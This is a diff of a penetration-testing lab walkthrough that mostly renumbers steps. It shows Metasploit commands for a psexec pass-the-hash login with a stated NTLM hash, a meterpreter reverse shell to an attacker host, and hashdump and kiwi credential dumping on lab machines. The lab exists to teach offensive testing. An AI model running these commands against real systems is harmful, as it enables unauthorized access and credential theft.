@@ -23,22 +23,19 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.168.110 lport=7477 -f 
 10. Perform information gathering and enumeration against M1 with nmap<BR>
 11. We know the password for M2's local Administrator, let's try it against M1.<BR>
 12. With SMB open, what can we use to get onto M1?  The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. #It was written by sysinternals and has been integrated within the framework.<BR>
-<BR>
 13. Within msfconsole:<BR>
- use exploit/windows/smb/psexec<BR>
- set rhost 192.168.168.101<BR>
- set SMBUser Administrator<BR>
- set SMBPass aad3b435b51404eeaad3b435b51404ee:e7bf67913f1f54abf11af55aee36b9e9<BR>
- show options<BR>
- set payload windows/meterpreter/reverse_tcp<BR>
- set lhost 192.168.168.110<BR>
- set lport 7479<BR>
- exploit<BR>
-<BR>
-meterpreter > hashdump<BR>
+use exploit/windows/smb/psexec<BR>
+set rhost 192.168.168.101<BR>
+set SMBUser Administrator<BR>
+set SMBPass aad3b435b51404eeaad3b435b51404ee:e7bf67913f1f54abf11af55aee36b9e9<BR>
+show options<BR>
+set payload windows/meterpreter/reverse_tcp<BR>
+set lhost 192.168.168.110<BR>
+set lport 7479<BR>
+exploit<BR>
+14. meterpreter > hashdump<BR>
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.<BR>
- 
-14. meterpreter > sysinfo<BR>
+meterpreter > sysinfo<BR>
 Computer        : M1<BR>
 OS              : Windows 2008 R2 (Build 7601, Service Pack 1).<BR>
 Architecture    : x64 (Current Process is WOW64)<BR>
@@ -52,7 +49,7 @@ set lhost 192.168.168.110<BR>
 exploit<BR>
 meterpreter> hashdump<BR>
 
-15. Now try getting the password in plaintext. If for some reason you don’t see Alice’s password within a 64 bit Meterpreter shell, you need to delete the M1 virtual and re-extract the zip file or redownload it from Google Drive. Remember, interactive logins are wiped from memory when the system restarts!<BR>
+16. Now try getting the password in plaintext. If for some reason you don’t see Alice’s password within a 64 bit Meterpreter shell, you need to delete the M1 virtual and re-extract the zip file or redownload it from Google Drive. Remember, interactive logins are wiped from memory when the system restarts!<BR>
 meterpreter> load kiwi<BR>
 meterpreter> help<BR>
 meterpreter> creds_all<BR>
